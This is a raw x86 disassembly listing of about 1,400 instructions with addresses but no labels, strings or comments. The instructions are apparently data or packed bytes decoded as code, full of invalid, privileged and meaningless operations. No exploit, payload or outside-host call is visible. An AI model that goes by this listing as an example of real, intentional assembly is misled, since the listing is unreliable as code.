  41e89d:	inc    eax
  41e89e:	test   BYTE PTR [eax+0x0],al
  41e8a1:	bound  ebx,QWORD PTR [eax+0x62]
  41e8a4:	inc    ecx
  41e8a5:	inc    eax
  41e8a6:	arpl   WORD PTR [eax],dx
  41e8a8:	cmp    al,0x4a
  41e8aa:	cmp    DWORD PTR [eax+0x73],esi
  41e8ad:	push   edi
  41e8ae:	dec    edx
  41e8af:	or     al,0x1e
  41e8b1:	call   0x328de7d6
  41e8b6:	int3   
  41e8b7:	int    0xa8
  41e8b9:	or     BYTE PTR [edi],al
  41e8bb:	es jno 0x41e8fe
  41e8be:	jp     0x41e908
  41e8c0:	bound  ebp,QWORD PTR [eax+0x1e7042d5]
  41e8c6:	test   al,0x10
  41e8c8:	bound  eax,QWORD PTR [eax+0x41]
  41e8cb:	and    eax,0x40000500
  41e8d0:	inc    ebx
  41e8d1:	add    eax,0x40624041
  41e8d6:	inc    ebx
  41e8d7:	add    eax,0x43402541
  41e8dc:	bound  eax,QWORD PTR [eax+0x43]
  41e8df:	int3   
  41e8e0:	inc    eax
  41e8e1:	bound  eax,QWORD PTR [eax]
  41e8e3:	inc    ecx
  41e8e4:	inc    eax
  41e8e5:	inc    eax
  41e8e6:	add    eax,0xfcac0505
  41e8eb:	cmp    BYTE PTR [eax],dl
  41e8ed:	mul    DWORD PTR [edi+0x12]
  41e8f0:	retf   
  41e8f1:	ret    
  41e8f2:	ds aaa 
  41e8f4:	xor    bh,BYTE PTR [edi+0x1b]
  41e8f7:	hlt    
  41e8f8:	inc    ebx
  41e8f9:	sub    bl,BYTE PTR fs:0x41ab3f52
  41e900:	add    al,0xbe
  41e902:	xor    eax,0x517fb1fe
  41e907:	fs dec esp
  41e909:	arpl   WORD PTR [edx-0x6c],ax
  41e90c:	inc    ebp
  41e90d:	aas    
  41e90e:	inc    esp
  41e90f:	mov    BYTE PTR [edx+0x1d],ah
  41e912:	dec    eax
  41e913:	bound  eax,QWORD PTR [eax+0x25]
  41e916:	add    BYTE PTR [esi+0x40],ah
  41e919:	add    eax,0x40404143
  41e91e:	inc    ebx
  41e91f:	add    BYTE PTR [eax],al
  41e921:	add    BYTE PTR [edx-0x34],ah
  41e924:	inc    eax
  41e925:	add    eax,0x40004041
  41e92a:	inc    ecx
  41e92b:	int3   
  41e92c:	add    BYTE PTR [ebx-0x7c],al
  41e92f:	add    eax,0x5406240
  41e934:	(bad)  
  41e935:	enter  0x7f37,0x2b
  41e939:	arpl   WORD PTR [ecx+0x4d463dd4],sp
  41e93f:	aas    
  41e940:	and    al,0xf8
  41e942:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e943:	dec    ebx
  41e944:	ret    
  41e945:	iret   
  41e946:	(bad)  
  41e947:	jg     0x41e99e
  41e949:	or     eax,0xd340e039
  41e94e:	inc    eax
  41e94f:	bound  ebx,QWORD PTR [eax+0x41]
  41e952:	add    eax,0x40404340
  41e957:	inc    ebx
  41e958:	inc    eax
  41e959:	test   BYTE PTR [eax],al
  41e95b:	add    eax,0x40624041
  41e960:	inc    eax
  41e961:	add    BYTE PTR [edx+0x5],ah
  41e964:	inc    ebx
  41e965:	add    BYTE PTR [eax+0x78],al
  41e968:	inc    ecx
  41e969:	add    BYTE PTR [eax+0x41],bl
  41e96c:	bound  ebx,QWORD PTR [eax+0x3f]
  41e96f:	retf   
  41e970:	retf   
  41e971:	add    ch,BYTE PTR [ecx+0x44]
  41e974:	inc    eax
  41e975:	push   ecx
  41e976:	inc    edi
  41e977:	dec    esp
  41e978:	inc    eax
  41e979:	scas   eax,DWORD PTR es:[edi]
  41e97a:	push   eax
  41e97b:	jge    0x41e9dd
  41e97d:	sbb    bh,bl
  41e97f:	or     eax,0xf0d0fd2a
  41e984:	inc    eax
  41e985:	adc    DWORD PTR [edi-0xa05bdbe],edi
  41e98b:	bound  eax,QWORD PTR [eax+0x1f]
  41e98e:	dec    eax
  41e98f:	inc    esp
  41e990:	test   BYTE PTR [edx+edx*2+0x5f4a4065],0xe8
  41e998:	inc    eax
  41e999:	test   BYTE PTR [eax],al
  41e99b:	int3   
  41e99c:	bound  eax,QWORD PTR ds:0xcc840f41
  41e9a2:	inc    ebx
  41e9a3:	add    BYTE PTR [eax+0x0],al
  41e9a6:	inc    eax
  41e9a7:	inc    eax
  41e9a8:	inc    eax
  41e9a9:	int3   
  41e9aa:	add    BYTE PTR ds:0x62404341,al
  41e9b0:	pop    eax
  41e9b1:	add    BYTE PTR [ebx+0x40],al
  41e9b4:	bound  ecx,QWORD PTR [edi]
  41e9b6:	inc    eax
  41e9b7:	inc    esp
  41e9b8:	in     eax,dx
  41e9b9:	mov    ebp,0x7fd55000
  41e9be:	adc    BYTE PTR [ebx-0x1e],ah
  41e9c1:	push   ss
  41e9c2:	arpl   WORD PTR [eax+0x4a],ax
  41e9c5:	aas    
  41e9c6:	inc    ebp
  41e9c7:	sub    BYTE PTR [eax-0x20bf4a57],0x40
  41e9ce:	dec    edx
  41e9cf:	adc    eax,0x5c10
  41e9d4:	inc    eax
  41e9d5:	inc    eax
  41e9d6:	cmovno eax,DWORD PTR ds:0x40056243
  41e9dd:	int3   
  41e9de:	add    ah,cl
  41e9e0:	inc    eax
  41e9e1:	inc    eax
  41e9e2:	bound  eax,QWORD PTR [ecx+0x0]
  41e9e5:	add    BYTE PTR [edi],cl
  41e9e7:	inc    ebx
  41e9e8:	inc    eax
  41e9e9:	inc    eax
  41e9ea:	add    BYTE PTR [ecx+0x43],al
  41e9ed:	add    eax,0x40256240
  41e9f2:	bound  eax,QWORD PTR [eax]
  41e9f4:	dec    eax
  41e9f5:	inc    eax
  41e9f6:	push   0x41cd7ed3
  41e9fb:	scas   eax,DWORD PTR es:[edi]
  41e9fc:	xor    eax,0x525bf550
  41ea01:	adc    DWORD PTR [edx],esp
  41ea03:	retf   
  41ea04:	addr16 inc eax
  41ea06:	imul   edx,DWORD PTR [ecx+0x58],0x4051ece8
  41ea0d:	inc    eax
  41ea0e:	push   ecx
  41ea0f:	das    
  41ea10:	xor    cl,BYTE PTR ds:0x40631d1a
  41ea16:	inc    eax
  41ea17:	std    
  41ea18:	add    eax,0x4140cc00
  41ea1d:	inc    eax
  41ea1e:	inc    ebx
  41ea1f:	bound  esp,QWORD PTR ds:0x41400043
  41ea25:	add    BYTE PTR [eax],al
  41ea27:	add    eax,0x43624062
  41ea2c:	inc    ecx
  41ea2d:	inc    eax
  41ea2e:	inc    eax
  41ea2f:	inc    eax
  41ea30:	add    eax,0x40624340
  41ea35:	add    eax,0x40664140
  41ea3a:	inc    edx
  41ea3b:	retf   
  41ea3c:	xor    al,0x32
  41ea3e:	mov    eax,0xde005010
  41ea43:	cmp    BYTE PTR [edi+0x264019ab],0x1f
  41ea4a:	inc    edi
  41ea4b:	add    eax,0x4061466d
  41ea50:	push   eax
  41ea51:	add    al,dl
  41ea53:	inc    esi
  41ea54:	cmp    ebx,DWORD PTR [ecx+0x1fb3404a]
  41ea5a:	push   edx
  41ea5b:	popa   
  41ea5c:	bound  esi,QWORD PTR [eax+0x63]
  41ea5f:	adc    BYTE PTR [ecx],ah
  41ea61:	inc    ecx
  41ea62:	rol    BYTE PTR ds:[ecx+eax*2-0x5d],1
  41ea67:	inc    ebx
  41ea68:	add    BYTE PTR ds:0x41107840,al
  41ea6e:	bound  eax,QWORD PTR [eax+0x40]
  41ea71:	sldt   WORD PTR [eax-0x34]
  41ea75:	js     0x41ead9
  41ea77:	add    eax,0x40664143
  41ea7c:	inc    ebx
  41ea7d:	add    BYTE PTR [ecx+0x5],al
  41ea80:	js     0x41eac2
  41ea82:	bound  eax,QWORD PTR [eax+0x0]
  41ea85:	inc    eax
  41ea86:	inc    eax
  41ea87:	cmp    edi,edi
  41ea89:	stos   DWORD PTR es:[edi],eax
  41ea8a:	bound  esp,QWORD PTR [eax-0x44bf3f37]
  41ea90:	mov    edi,0x262a3348
  41ea95:	lods   al,BYTE PTR ds:[esi]
  41ea96:	inc    ecx
  41ea97:	push   0x0
  41ea99:	inc    esp
  41ea9a:	xor    al,0xa8
  41ea9c:	mov    al,0x15
  41ea9e:	shl    BYTE PTR [ebx+0x1f],1
  41eaa1:	aaa    
  41eaa2:	inc    ecx
  41eaa3:	inc    ebx
  41eaa4:	inc    eax
  41eaa5:	inc    eax
  41eaa6:	add    eax,0x434162
  41eaab:	inc    eax
  41eaac:	add    BYTE PTR [edx+0x5],ah
  41eaaf:	inc    eax
  41eab0:	adc    BYTE PTR [edx+0x40],ah
  41eab3:	inc    ebx
  41eab4:	inc    ecx
  41eab5:	add    eax,0x4340
  41eaba:	add    eax,0x404162
  41eabf:	add    BYTE PTR [eax+0x43],al
  41eac2:	inc    eax
  41eac3:	add    eax,0xcd4112df
  41eac8:	inc    eax
  41eac9:	xor    al,0x77
  41eacb:	and    BYTE PTR [esi],bh
  41eacd:	inc    edx
  41eace:	xchg   edx,eax
  41eacf:	fadd   QWORD PTR [eax+0x31]
  41ead2:	pop    ds
  41ead3:	dec    ebp
  41ead4:	inc    eax
  41ead5:	add    DWORD PTR [ebx+eiz*4+0x40],ebx
  41ead9:	jns    0x41eadb
  41eadb:	and    esp,DWORD PTR [ecx+0x14]
  41eade:	bound  esp,QWORD PTR [ebp+0x40]
  41eae1:	mov    cl,0x1f
  41eae3:	and    ch,BYTE PTR [ecx]
  41eae5:	int    0x8e
  41eae7:	fild   WORD PTR [eax+0x49]
  41eaea:	push   0x62
  41eaec:	add    eax,0xd1988148
  41eaf1:	push   ecx
  41eaf2:	stc    
  41eaf3:	dec    ebp
  41eaf4:	xchg   DWORD PTR ds:0x4c40f640,ecx
  41eafa:	xor    ax,WORD PTR [eax+0x0]
  41eafe:	add    BYTE PTR [ecx+0x43],al
  41eb01:	add    eax,0x41784062
  41eb06:	inc    eax
  41eb07:	inc    eax
  41eb08:	add    BYTE PTR [edi],cl
  41eb0a:	bound  eax,QWORD PTR [ebx+0x0]
  41eb0d:	add    eax,0x25006240
  41eb12:	inc    eax
  41eb13:	add    eax,0x40254143
  41eb18:	add    eax,0x47620000
  41eb1d:	retf   
  41eb1e:	fsubrp st(0),st
  41eb20:	inc    eax
  41eb21:	lock test DWORD PTR [eax+0x33],0x400d68b4
  41eb29:	and    al,0x69
  41eb2b:	add    DWORD PTR [eax+0x3fcb0548],edx
  41eb31:	dec    edi
  41eb32:	fwait
  41eb33:	xchg   ebx,eax
  41eb34:	adc    eax,0x40b0c97b
  41eb39:	ror    DWORD PTR [ecx+0xc],cl
  41eb3c:	jnp    0x41eace
  41eb3e:	pushf  
  41eb3f:	test   BYTE PTR [eax-0x6e],0xd7
  41eb43:	push   ebp
  41eb44:	lods   al,BYTE PTR ds:[esi]
  41eb45:	bound  edx,QWORD PTR ds:0x56d34023
  41eb4b:	jnp    0x41eb62
  41eb4d:	adc    eax,0xbb3cb0c9
  41eb52:	pop    ebp
  41eb53:	inc    ebp
  41eb54:	inc    esi
  41eb55:	test   DWORD PTR [eax+0x5],0x431740
  41eb5c:	add    BYTE PTR [eax],al
  41eb5e:	inc    ecx
  41eb5f:	inc    eax
  41eb60:	bound  esp,QWORD PTR [esi+0x0]
  41eb63:	inc    eax
  41eb64:	add    eax,0x5400000
  41eb69:	inc    ecx
  41eb6a:	inc    eax
  41eb6b:	inc    eax
  41eb6c:	bound  esp,QWORD PTR ds:0x25050043
  41eb72:	inc    ecx
  41eb73:	inc    ebx
  41eb74:	inc    eax
  41eb75:	test   BYTE PTR [eax+0x0],al
  41eb78:	bound  ebx,QWORD PTR [eax+0x62]
  41eb7b:	inc    ecx
  41eb7c:	inc    eax
  41eb7d:	mov    edi,0x904f90a8
  41eb82:	leave  
  41eb83:	inc    eax
  41eb84:	aas    
  41eb85:	add    eax,0xc33b286c
  41eb8a:	inc    esp
  41eb8b:	inc    eax
  41eb8c:	pop    ds
  41eb8d:	adc    DWORD PTR [edx-0x38],esp
  41eb90:	xor    al,0xa0
  41eb92:	adc    BYTE PTR [edx+0x40],ah
  41eb95:	inc    ecx
  41eb96:	and    eax,0x40000500
  41eb9b:	inc    ebx
  41eb9c:	add    eax,0x40624041
  41eba1:	inc    ebx
  41eba2:	add    eax,0x43402541
  41eba7:	bound  eax,QWORD PTR [eax+0x43]
  41ebaa:	int3   
  41ebab:	inc    eax
  41ebac:	bound  eax,QWORD PTR [eax]
  41ebae:	inc    ecx
  41ebaf:	inc    eax
  41ebb0:	inc    eax
  41ebb1:	add    eax,0xf12e4105
  41ebb6:	jmp    0x601b0ed
  41ebbb:	push   ebp
  41ebbc:	inc    eax
  41ebbd:	xchg   esi,eax
  41ebbe:	mov    cl,0x43
  41ebc0:	dec    edi
  41ebc1:	mov    ah,0x47
  41ebc3:	fadd   QWORD PTR [eax-0x6d]
  41ebc6:	int    0xa5
  41ebc8:	lods   al,BYTE PTR ds:[esi]
  41ebc9:	cmp    eax,0x6b40db44
  41ebce:	adc    eax,0xdcc30d45
  41ebd3:	test   al,0x40
  41ebd5:	push   ecx
  41ebd6:	dec    ecx
  41ebd7:	xor    BYTE PTR [ebx+0x46],bh
  41ebda:	sub    bl,0xd7
  41ebdd:	sbb    ebx,DWORD PTR [ecx-0x3e3f7b1f]
  41ebe3:	mov    es:0xda914f3,al
  41ebe9:	les    ebx,FWORD PTR [eax+eax*2+0x254062e7]
  41ebf0:	add    BYTE PTR [esi+0x40],ah
  41ebf3:	add    eax,0x40404143
  41ebf8:	inc    ebx
  41ebf9:	add    BYTE PTR [eax],al
  41ebfb:	add    BYTE PTR [edx-0x34],ah
  41ebfe:	inc    eax
  41ebff:	add    eax,0x40004041
  41ec04:	inc    ecx
  41ec05:	int3   
  41ec06:	add    BYTE PTR [ebx-0x7c],al
  41ec09:	add    eax,0x5406240
  41ec0e:	bound  esi,QWORD PTR [eax]
  41ec10:	ja     0x41ec54
  41ec12:	retf   
  41ec13:	bound  edx,QWORD PTR ds:0x60343540
  41ec19:	leave  
  41ec1a:	inc    esi
  41ec1b:	push   es
  41ec1c:	retf   
  41ec1d:	inc    ecx
  41ec1e:	sub    eax,0x2e40f717
  41ec23:	jl     0x41ec67
  41ec25:	pop    es
  41ec26:	inc    eax
  41ec27:	bound  ebx,QWORD PTR [eax+0x41]
  41ec2a:	add    eax,0x40404340
  41ec2f:	inc    ebx
  41ec30:	inc    eax
  41ec31:	test   BYTE PTR [eax],al
  41ec33:	add    eax,0x40624041
  41ec38:	inc    eax
  41ec39:	add    BYTE PTR [edx+0x5],ah
  41ec3c:	inc    ebx
  41ec3d:	add    BYTE PTR [eax+0x78],al
  41ec40:	inc    ecx
  41ec41:	add    BYTE PTR [eax+0x41],bl
  41ec44:	bound  ecx,QWORD PTR [esi-0x37fea4ba]
  41ec4a:	arpl   WORD PTR [edx+0x41],cx
  41ec4d:	cmp    DWORD PTR [eax-0x34b06c67],0xbd77ffa8
  41ec57:	push   ebx
  41ec58:	sbb    al,0x24
  41ec5a:	push   es
  41ec5b:	mov    fs,WORD PTR [edx+edx*2]
  41ec5e:	add    esi,DWORD PTR [edi]
  41ec60:	loope  0x41ec0b
  41ec62:	jge    0x41ec0d
  41ec64:	inc    esp
  41ec65:	aam    0x8f
  41ec67:	mov    edi,0x41660d4c
  41ec6c:	inc    edi
  41ec6d:	xor    DWORD PTR fs:[ebp+0x15],eax
  41ec71:	inc    eax
  41ec72:	test   BYTE PTR [eax],al
  41ec74:	int3   
  41ec75:	bound  eax,QWORD PTR ds:0xcc840f41
  41ec7b:	inc    ebx
  41ec7c:	add    BYTE PTR [eax+0x0],al
  41ec7f:	inc    eax
  41ec80:	inc    eax
  41ec81:	inc    eax
  41ec82:	int3   
  41ec83:	add    BYTE PTR ds:0x62404341,al
  41ec89:	pop    eax
  41ec8a:	add    BYTE PTR [ebx+0x40],al
  41ec8d:	bound  ecx,QWORD PTR [edi]
  41ec8f:	inc    eax
  41ec90:	and    bh,dh
  41ec92:	or     bh,BYTE PTR [ecx]
  41ec94:	sub    al,BYTE PTR [ebp-0x2b]
  41ec97:	retf   
  41ec98:	pusha  
  41ec99:	dec    edi
  41ec9a:	addr16 push ebp
  41ec9c:	xchg   esi,eax
  41ec9d:	push   ecx
  41ec9e:	jp     0x41ecef
  41eca0:	into   
  41eca1:	test   DWORD PTR [eax+0x1549d90f],esp
  41eca7:	xor    eax,DWORD PTR [eax]
  41eca9:	add    BYTE PTR [eax+0x40],al
  41ecac:	cmovno eax,DWORD PTR ds:0x40056243
  41ecb3:	int3   
  41ecb4:	add    ah,cl
  41ecb6:	inc    eax
  41ecb7:	inc    eax
  41ecb8:	bound  eax,QWORD PTR [ecx+0x0]
  41ecbb:	add    BYTE PTR [edi],cl
  41ecbd:	inc    ebx
  41ecbe:	inc    eax
  41ecbf:	inc    eax
  41ecc0:	add    BYTE PTR [ecx+0x43],al
  41ecc3:	add    eax,0x40256240
  41ecc8:	bound  eax,QWORD PTR [eax]
  41ecca:	test   al,0x22
  41eccc:	or     eax,0x51926f63
  41ecd1:	inc    eax
  41ecd2:	adc    dl,BYTE PTR [edx+0x4a]
  41ecd5:	inc    bl
  41ecd7:	daa    
  41ecd8:	mov    edi,0x2aa9a801
  41ecdd:	ins    BYTE PTR es:[edi],dx
  41ecde:	sub    ebx,DWORD PTR [ebx+0x6]
  41ece1:	nop
  41ece2:	inc    edx
  41ece3:	mov    al,0x40
  41ece5:	inc    ecx
  41ece6:	aas    
  41ece7:	jno    0x41ed5e
  41ece9:	mov    ah,0x20
  41eceb:	mov    dl,0x91
  41eced:	and    eax,0x4d666269
  41ecf2:	cmp    al,0x2a
  41ecf4:	ret    
  41ecf5:	pop    esp
  41ecf6:	push   0xd7b7111
  41ecfb:	inc    esi
  41ecfc:	mov    al,ds:0x7c236ffa
  41ed01:	add    eax,0x4140cc00
  41ed06:	inc    eax
  41ed07:	inc    ebx
  41ed08:	bound  esp,QWORD PTR ds:0x41400043
  41ed0e:	add    BYTE PTR [eax],al
  41ed10:	add    eax,0x43624062
  41ed15:	inc    ecx
  41ed16:	inc    eax
  41ed17:	inc    eax
  41ed18:	inc    eax
  41ed19:	add    eax,0x40624340
  41ed1e:	add    eax,0x40664140
  41ed23:	mov    esp,0x750d50cb
  41ed28:	loope  0x41ecfd
  41ed2a:	adc    cl,BYTE PTR ds:0x58cb7610
  41ed30:	fnstenv [edi]
  41ed32:	xor    bl,cl
  41ed34:	test   BYTE PTR [ebx+eax*2-0x41],bh
  41ed38:	ror    DWORD PTR [edx],0x43
  41ed3b:	add    BYTE PTR ds:0x41107840,al
  41ed41:	bound  eax,QWORD PTR [eax+0x40]
  41ed44:	sldt   WORD PTR [eax-0x34]
  41ed48:	js     0x41edac
  41ed4a:	add    eax,0x40664143
  41ed4f:	inc    ebx
  41ed50:	add    BYTE PTR [ecx+0x5],al
  41ed53:	js     0x41ed95
  41ed55:	bound  eax,QWORD PTR [eax+0x0]
  41ed58:	inc    eax
  41ed59:	popa   
  41ed5a:	inc    ebp
  41ed5b:	add    eax,0x87dd676b
  41ed60:	xor    dh,BYTE PTR [ebx+0x3c41cb40]
  41ed66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed67:	mov    ah,BYTE PTR [ecx]
  41ed69:	mov    ebp,0x45fc4328
  41ed6e:	mov    esp,0xac606026
  41ed73:	popa   
  41ed74:	inc    ebx
  41ed75:	inc    eax
  41ed76:	dec    ebx
  41ed77:	fs pop ecx
  41ed79:	jno    0x41edcd
  41ed7b:	pusha  
  41ed7c:	pusha  
  41ed7d:	mov    ecx,0x6b44ae30
  41ed82:	lds    eax,FWORD PTR [ecx+0x43]
  41ed85:	inc    eax
  41ed86:	inc    eax
  41ed87:	add    eax,0x434162
  41ed8c:	inc    eax
  41ed8d:	add    BYTE PTR [edx+0x5],ah
  41ed90:	inc    eax
  41ed91:	adc    BYTE PTR [edx+0x40],ah
  41ed94:	inc    ebx
  41ed95:	inc    ecx
  41ed96:	add    eax,0x4340
  41ed9b:	add    eax,0x404162
  41eda0:	add    BYTE PTR [eax+0x43],al
  41eda3:	inc    eax
  41eda4:	add    eax,0x436e0c6b
  41eda9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edaa:	mov    dl,0xf3
  41edac:	dec    edi
  41edad:	test   BYTE PTR [ecx+0x54],al
  41edb0:	xor    al,0xfa
  41edb2:	mov    al,ds:0xfd0d4251
  41edb7:	inc    eax
  41edb8:	xor    al,0xac
  41edba:	inc    ecx
  41edbb:	imul   DWORD PTR [esi]
  41edbd:	leave  
  41edbe:	jne    0x41edb9
  41edc0:	mov    esi,0xd5c6502d
  41edc5:	in     al,dx
  41edc6:	outs   dx,DWORD PTR ds:[esi]
  41edc7:	outs   dx,DWORD PTR ds:[esi]
  41edc8:	dec    ebx
  41edc9:	sbb    DWORD PTR [eax+0x7f],edi
  41edcc:	inc    esp
  41edcd:	or     eax,0x6492f7fc
  41edd2:	retf   0x7b78
  41edd5:	retf   
  41edd6:	arpl   WORD PTR [edi+0x43],cx
  41edd9:	pop    es
  41edda:	sbb    al,0xf3
  41eddc:	mov    ah,0xec
  41edde:	or     DWORD PTR [eax-0x14],edx
  41ede1:	inc    eax
  41ede2:	add    BYTE PTR [eax],al
  41ede4:	inc    ecx
  41ede5:	inc    ebx
  41ede6:	add    eax,0x41784062
  41edeb:	inc    eax
  41edec:	inc    eax
  41eded:	add    BYTE PTR [edi],cl
  41edef:	bound  eax,QWORD PTR [ebx+0x0]
  41edf2:	add    eax,0x25006240
  41edf7:	inc    eax
  41edf8:	add    eax,0x40254143
  41edfd:	add    eax,0xa3620000
  41ee02:	nop
  41ee03:	xor    eax,0xfc410505
  41ee08:	dec    ebx
  41ee09:	xlat   BYTE PTR ds:[ebx]
  41ee0a:	jo     0x41ee61
  41ee0c:	retf   
  41ee0d:	leave  
  41ee0e:	std    
  41ee0f:	test   esp,0xbc5830e1
  41ee15:	mov    al,0x4d
  41ee17:	bound  ebx,QWORD PTR [edx+ecx*1-0x30]
  41ee1b:	hlt    
  41ee1c:	adc    eax,0x4b2b6005
  41ee21:	das    
  41ee22:	ins    DWORD PTR es:[edi],dx
  41ee23:	add    al,0x43
  41ee25:	add    BYTE PTR [eax],al
  41ee27:	add    BYTE PTR [ecx+0x40],al
  41ee2a:	bound  esp,QWORD PTR [esi+0x0]
  41ee2d:	inc    eax
  41ee2e:	add    eax,0x5400000
  41ee33:	inc    ecx
  41ee34:	inc    eax
  41ee35:	inc    eax
  41ee36:	bound  esp,QWORD PTR ds:0x25050043
  41ee3c:	inc    ecx
  41ee3d:	inc    ebx
  41ee3e:	inc    eax
  41ee3f:	test   BYTE PTR [eax+0x0],al
  41ee42:	bound  ebx,QWORD PTR [eax+0x62]
  41ee45:	inc    ecx
  41ee46:	inc    eax
  41ee47:	inc    ebp
  41ee48:	imul   ebp,DWORD PTR [edi+0x33],0xffffffc5
  41ee4c:	xchg   ebx,eax
  41ee4d:	js     0x41ee0d
  41ee4f:	cmp    eax,0x47c9dc8c
  41ee54:	push   esp
  41ee55:	mov    al,0x40
  41ee57:	add    al,0x4a
  41ee59:	mov    ah,0x45
  41ee5b:	cmp    BYTE PTR [esi],ch
  41ee5d:	adc    edx,DWORD PTR [edx+eiz*2+0x23]
  41ee61:	lods   al,BYTE PTR ds:[esi]
  41ee62:	cmp    BYTE PTR [eax],dh
  41ee64:	add    ebx,DWORD PTR [esi+0x50]
  41ee67:	call   0x2541:0x4062102c
  41ee6e:	add    BYTE PTR ds:0x5434000,al
  41ee74:	inc    ecx
  41ee75:	inc    eax
  41ee76:	bound  eax,QWORD PTR [eax+0x43]
  41ee79:	add    eax,0x43402541
  41ee7e:	bound  eax,QWORD PTR [eax+0x43]
  41ee81:	int3   
  41ee82:	inc    eax
  41ee83:	bound  eax,QWORD PTR [eax]
  41ee85:	inc    ecx
  41ee86:	inc    eax
  41ee87:	inc    eax
  41ee88:	add    eax,0x9c0f6705
  41ee8d:	out    0x90,eax
  41ee8f:	aas    
  41ee90:	(bad)  
  41ee91:	in     al,dx
  41ee92:	jns    0x41eec4
  41ee94:	dec    ebx
  41ee95:	dec    esp
  41ee96:	pusha  
  41ee97:	push   eax
  41ee98:	dec    edi
  41ee99:	adc    eax,0x2ce68f20
  41ee9e:	jmp    0x135c:0x64c9403f
  41eea5:	icebp  
  41eea6:	push   eax
  41eea7:	xor    al,0x40
  41eea9:	nop
  41eeaa:	pushf  
  41eeab:	test   al,0xd0
  41eead:	test   DWORD PTR [ebx],esi
  41eeaf:	push   edi
  41eeb0:	add    DWORD PTR [ecx+0x28],eax
  41eeb3:	push   eax
  41eeb4:	inc    ecx
  41eeb5:	dec    esp
  41eeb6:	jnp    0x41ef29
  41eeb8:	nop
  41eeb9:	push   ebx
  41eeba:	push   esp
  41eebb:	bound  eax,QWORD PTR [eax+0x25]
  41eebe:	add    BYTE PTR [esi+0x40],ah
  41eec1:	add    eax,0x40404143
  41eec6:	inc    ebx
  41eec7:	add    BYTE PTR [eax],al
  41eec9:	add    BYTE PTR [edx-0x34],ah
  41eecc:	inc    eax
  41eecd:	add    eax,0x40004041
  41eed2:	inc    ecx
  41eed3:	int3   
  41eed4:	add    BYTE PTR [ebx-0x7c],al
  41eed7:	add    eax,0x5406240
  41eedc:	(bad)  
  41eede:	sbb    BYTE PTR [edx+0x71],ah
  41eee1:	jmp    0xa472:0xa01520b8
  41eee8:	jo     0x41ee80
  41eeea:	inc    ebp
  41eeeb:	nop
  41eeec:	retf   
  41eeed:	adc    eax,0x9510d6c
  41eef2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eef3:	or     eax,0x586240bc
  41eef8:	inc    ecx
  41eef9:	add    eax,0x40404340
  41eefe:	inc    ebx
  41eeff:	inc    eax
  41ef00:	test   BYTE PTR [eax],al
  41ef02:	add    eax,0x40624041
  41ef07:	inc    eax
  41ef08:	add    BYTE PTR [edx+0x5],ah
  41ef0b:	inc    ebx
  41ef0c:	add    BYTE PTR [eax+0x78],al
  41ef0f:	inc    ecx
  41ef10:	add    BYTE PTR [eax+0x41],bl
  41ef13:	(bad)  
  41ef14:	retf   
  41ef15:	dec    edx
  41ef16:	bound  esp,QWORD PTR [edx+0x47]
  41ef19:	jl     0x41ef94
  41ef1b:	add    eax,0x9740999c
  41ef20:	mov    bh,0x6f
  41ef22:	mov    al,0x43
  41ef24:	add    eax,0xad44fd73
  41ef29:	nop
  41ef2a:	or     eax,0x424acb44
  41ef2f:	rcr    DWORD PTR [edx-0xc],cl
  41ef32:	imul   eax,DWORD PTR [eax+ecx*2-0x27],0xffffffe6
  41ef37:	inc    eax
  41ef38:	push   ecx
  41ef39:	arpl   WORD PTR [edi+edx*8-0xf20eabd],cx
  41ef40:	dec    esi
  41ef41:	pop    ds
  41ef42:	inc    eax
  41ef43:	test   BYTE PTR [eax],al
  41ef45:	int3   
  41ef46:	bound  eax,QWORD PTR ds:0xcc840f41
  41ef4c:	inc    ebx
  41ef4d:	add    BYTE PTR [eax+0x0],al
  41ef50:	inc    eax
  41ef51:	inc    eax
  41ef52:	inc    eax
  41ef53:	int3   
  41ef54:	add    BYTE PTR ds:0x62404341,al
  41ef5a:	pop    eax
  41ef5b:	add    BYTE PTR [ebx+0x40],al
  41ef5e:	bound  ecx,QWORD PTR [edi]
  41ef60:	inc    eax
  41ef61:	or     eax,0x8335ecc0
  41ef66:	and    DWORD PTR [eax-0x5f9c34e0],esi
  41ef6c:	inc    edx
  41ef6d:	jne    0x41efaf
  41ef6f:	pusha  
  41ef70:	arpl   WORD PTR [esi-0x34],ax
  41ef73:	adc    eax,0xe9f0de4c
  41ef78:	mov    ebp,0x3d53a840
  41ef7d:	bound  edi,QWORD PTR [ebp+0x1174c453]
  41ef83:	pushf  
  41ef84:	ret    
  41ef85:	mov    ebx,0x694f4627
  41ef8a:	add    BYTE PTR [eax],al
  41ef8c:	inc    eax
  41ef8d:	inc    eax
  41ef8e:	cmovno eax,DWORD PTR ds:0x40056243
  41ef95:	int3   
  41ef96:	add    ah,cl
  41ef98:	inc    eax
  41ef99:	inc    eax
  41ef9a:	bound  eax,QWORD PTR [ecx+0x0]
  41ef9d:	add    BYTE PTR [edi],cl
  41ef9f:	inc    ebx
  41efa0:	inc    eax
  41efa1:	inc    eax
  41efa2:	add    BYTE PTR [ecx+0x43],al
  41efa5:	add    eax,0x40256240
  41efaa:	bound  eax,QWORD PTR [eax]
  41efac:	dec    esp
  41efad:	add    eax,0x72311f1b
  41efb2:	sub    BYTE PTR [ecx+eax*2-0x2ec0bbbd],al
  41efb9:	sub    eax,0xd9b30543
  41efbe:	inc    ebx
  41efbf:	leave  
  41efc0:	inc    ecx
  41efc1:	repnz bound eax,QWORD PTR [edi-0x53d7b5dc]
  41efc8:	jo     0x41ef9d
  41efca:	test   DWORD PTR [eax-0x44],0x39d85044
  41efd1:	(bad)  
  41efd2:	stos   DWORD PTR es:[edi],eax
  41efd3:	inc    ecx
  41efd4:	mov    bl,0xff
  41efd6:	inc    ebx
  41efd7:	jmp    0x41eff9
  41efd9:	aas    
  41efda:	inc    edx
  41efdb:	das    
  41efdc:	lds    ecx,FWORD PTR [edi+0x29]
  41efdf:	jle    0x41efe6
  41efe1:	add    ah,cl
  41efe3:	inc    eax
  41efe4:	inc    ecx
  41efe5:	inc    eax
  41efe6:	inc    ebx
  41efe7:	bound  esp,QWORD PTR ds:0x41400043
  41efed:	add    BYTE PTR [eax],al
  41efef:	add    eax,0x43624062
  41eff4:	inc    ecx
  41eff5:	inc    eax
  41eff6:	inc    eax
  41eff7:	inc    eax
  41eff8:	add    eax,0x40624340
  41effd:	add    eax,0x40664140
  41f002:	icebp  
  41f003:	fwait
  41f004:	icebp  
  41f005:	jl     0x41f06a
  41f007:	push   eax
